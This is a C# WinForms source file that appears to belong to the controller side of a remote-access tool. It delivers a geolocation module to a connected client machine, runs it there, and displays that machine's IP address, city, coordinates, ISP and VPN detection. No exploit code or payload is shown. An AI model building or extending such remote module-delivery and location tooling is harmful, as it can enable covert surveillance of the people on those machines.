using System.Text.Json;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class AdvancedGeoLocationForm : Form
{
    private const string ModuleFile = "mullvad.Module.GeoLocation";
    private const string ModuleId   = "mullvad.geolocation";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ─────────────────────────────────────────────────────────────
    private ToolStrip            toolbar      = null!;
    private ToolStripButton      btnRefresh   = null!;
    private ListView             listView     = null!;
    private StatusStrip          statusStrip  = null!;
    private ToolStripStatusLabel statusLabel  = null!;
    private Panel                loadingPanel = null!;
    private Label                loadingLabel = null!;

    // ── Singleton per handler ─────────────────────────────────────────────────
    private static readonly Dictionary<ClientHandler, AdvancedGeoLocationForm> _active = new();
    public static AdvancedGeoLocationForm CreateOrActivate(ClientHandler h)
    {
        if (_active.TryGetValue(h, out var ex) && !ex.IsDisposed) { ex.BringToFront(); return ex; }
        var frm = new AdvancedGeoLocationForm(h);
        _active[h] = frm;
        frm.FormClosed += (_, _) => _active.Remove(h);
        return frm;
    }

    private AdvancedGeoLocationForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Construction
    // ─────────────────────────────────────────────────────────────────────────
    private void Build()
    {
        SuspendLayout();

        Text          = $"Advanced Geo-Location  —  {_handler.Info.Computer}";
        ClientSize    = new Size(680, 540);
        MinimumSize   = new Size(520, 400);
        Font          = new Font("Segoe UI", 9F);
        StartPosition = FormStartPosition.CenterParent;
        ShowInTaskbar = true;

        var ico = IconLoader.Load("world_link.png");
        if (ico != null) Icon = Icon.FromHandle(((Bitmap)ico).GetHicon());

        // ── Toolbar ──────────────────────────────────────────────────────────
        toolbar    = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };
        btnRefresh = MakeBtn("⟳", "Refresh", "refresh.png");
        btnRefresh.Click += (_, _) => _ = CollectAsync();
        toolbar.Items.Add(btnRefresh);

        // ── ListView ─────────────────────────────────────────────────────────
        listView = new ListView
        {
            Dock          = DockStyle.Fill,
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = true,
            ShowGroups    = true,
            Font          = new Font("Segoe UI", 9F),
        };
        listView.Columns.Add("Field",  200);
        listView.Columns.Add("Value",   -2);

        // ── Status strip ─────────────────────────────────────────────────────
        statusStrip = new StatusStrip();
        statusLabel = new ToolStripStatusLabel { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusStrip.Items.Add(statusLabel);

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel { Dock = DockStyle.Fill, Visible = true };
        loadingLabel = new Label
        {
            Text      = "Delivering module to client…",
            Dock      = DockStyle.Fill,
            TextAlign = ContentAlignment.MiddleCenter,
            Font      = new Font("Segoe UI", 10F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        Controls.Add(loadingPanel);
        Controls.Add(listView);
        Controls.Add(toolbar);
        Controls.Add(statusStrip);
        loadingPanel.BringToFront();

        ResumeLayout(false);
        PerformLayout();

        Load       += OnLoad;
        FormClosed += OnFormClosed;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Load
    // ─────────────────────────────────────────────────────────────────────────
    private async void OnLoad(object? sender, EventArgs e)
    {
        btnRefresh.Enabled = false;
        _handler.Disconnected += OnDisconnected;

        var progress = new Progress<string>(msg =>
        {
            loadingLabel.Text = msg;
            statusLabel.Text  = msg;
        });

        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes == null)
        {
            loadingLabel.Text = "Module file not found. Build the GeoLocation project first.";
            statusLabel.Text  = "Module not found.";
            return;
        }

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(45));
        bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, progress, cts.Token);
        if (!ok)
        {
            loadingLabel.Text = "Failed to deliver module.";
            statusLabel.Text  = "Module delivery failed.";
            return;
        }

        _ctx = new ModuleContext(_handler, ModuleId);
        _ctx.Disconnected += (_, _) => BeginInvoke(() => OnDisconnected(_handler));
        loadingPanel.Visible = false;
        btnRefresh.Enabled   = true;

        await CollectAsync();
    }

    private void OnFormClosed(object? sender, FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnDisconnected;
        _ctx?.Dispose();
    }

    private void OnDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            btnRefresh.Enabled   = false;
            statusLabel.Text     = "Disconnected.";
            loadingLabel.Text    = "Client disconnected.";
            loadingPanel.Visible = true;
        });
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Collect & display
    // ─────────────────────────────────────────────────────────────────────────
    private async Task CollectAsync()
    {
        if (_ctx == null) return;
        btnRefresh.Enabled = false;
        statusLabel.Text   = "Fetching advanced geo-location data…";
        try
        {
            var json = await _ctx.ExecuteAsync("advanced", "");
            ParseAndDisplay(json);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { btnRefresh.Enabled = true; }
    }

    private void ParseAndDisplay(string json)
    {
        listView.BeginUpdate();
        listView.Items.Clear();
        listView.Groups.Clear();
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            // error from module itself
            if (root.TryGetProperty("error", out var err))
            {
                statusLabel.Text = $"Module error: {err.GetString()}";
                return;
            }

            // Combined response: { ipapi:{...}, ipapico:{...} }
            if (root.TryGetProperty("ipapi", out var ipapi))
            {
                AddGroup("IP-API (ip-api.com)", ipapi, IpapiLabels);
                if (root.TryGetProperty("ipapico", out var ipapico))
                    AddGroup("IPAPI.co (ipapi.co)", ipapico, IpapicLabels);
            }
            else
            {
                // Fallback: single ipapi response
                AddGroup("IP-API (ip-api.com)", root, IpapiLabels);
            }

            statusLabel.Text = $"Advanced geo-location data — {DateTime.Now:HH:mm:ss}";
        }
        catch (Exception ex)
        {
            statusLabel.Text = $"Parse error: {ex.Message}";
        }
        finally { listView.EndUpdate(); }
    }

    private void AddGroup(string groupName, JsonElement data, (string key, string label)[] labels)
    {
        var grp = new ListViewGroup(groupName, groupName);
        listView.Groups.Add(grp);

        foreach (var (key, label) in labels)
        {
            if (!data.TryGetProperty(key, out var v)) continue;

            string val = v.ValueKind switch
            {
                JsonValueKind.String  => v.GetString() ?? "",
                JsonValueKind.Number  => v.TryGetInt64(out var i) ? i.ToString() : v.GetDouble().ToString("G"),
                JsonValueKind.True    => "Yes",
                JsonValueKind.False   => "No",
                JsonValueKind.Null    => "(null)",
                _                    => v.ToString(),
            };

            if (string.IsNullOrWhiteSpace(val)) continue;

            var lvi = new ListViewItem(label, grp);
            lvi.SubItems.Add(val);
            listView.Items.Add(lvi);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Field maps
    // ─────────────────────────────────────────────────────────────────────────
    private static readonly (string, string)[] IpapiLabels =
    [
        ("query",         "IP Address"),
        ("status",        "Status"),
        ("continent",     "Continent"),
        ("continentCode", "Continent Code"),
        ("country",       "Country"),
        ("countryCode",   "Country Code"),
        ("region",        "Region Code"),
        ("regionName",    "Region Name"),
        ("city",          "City"),
        ("district",      "District"),
        ("zip",           "ZIP / Postal Code"),
        ("lat",           "Latitude"),
        ("lon",           "Longitude"),
        ("timezone",      "Timezone"),
        ("offset",        "UTC Offset (seconds)"),
        ("currency",      "Currency"),
        ("isp",           "ISP"),
        ("org",           "Organization"),
        ("as",            "AS"),
        ("asname",        "AS Name"),
        ("reverse",       "Reverse DNS"),
        ("mobile",        "Mobile Connection"),
        ("proxy",         "Proxy / VPN Detected"),
        ("hosting",       "Hosting / Datacenter"),
    ];

    private static readonly (string, string)[] IpapicLabels =
    [
        ("ip",               "IP Address"),
        ("version",          "IP Version"),
        ("city",             "City"),
        ("region",           "Region"),
        ("region_code",      "Region Code"),
        ("country",          "Country Code"),
        ("country_name",     "Country Name"),
        ("country_code_iso3","Country ISO3"),
        ("country_capital",  "Country Capital"),
        ("country_tld",      "Country TLD"),
        ("continent_code",   "Continent Code"),
        ("in_eu",            "In EU"),
        ("postal",           "Postal Code"),
        ("latitude",         "Latitude"),
        ("longitude",        "Longitude"),
        ("timezone",         "Timezone"),
        ("utc_offset",       "UTC Offset"),
        ("country_calling_code", "Calling Code"),
        ("currency",         "Currency Code"),
        ("currency_name",    "Currency Name"),
        ("languages",        "Languages"),
        ("country_area",     "Country Area (km²)"),
        ("country_population","Country Population"),
        ("asn",              "ASN"),
        ("org",              "Organization"),
        ("network",          "Network CIDR"),
    ];

    // ─────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ─────────────────────────────────────────────────────────────────────────
    private static ToolStripButton MakeBtn(string text, string tip, string? icon = null)
    {
        var btn = new ToolStripButton
        {
            ToolTipText  = tip,
            DisplayStyle = ToolStripItemDisplayStyle.Image,
            ImageScaling = ToolStripItemImageScaling.SizeToFit,
        };
        if (icon != null)
        {
            var img = IconLoader.Load(icon);
            if (img != null) { btn.Image = img; return btn; }
        }
        btn.Text         = text;
        btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        return btn;
    }
}
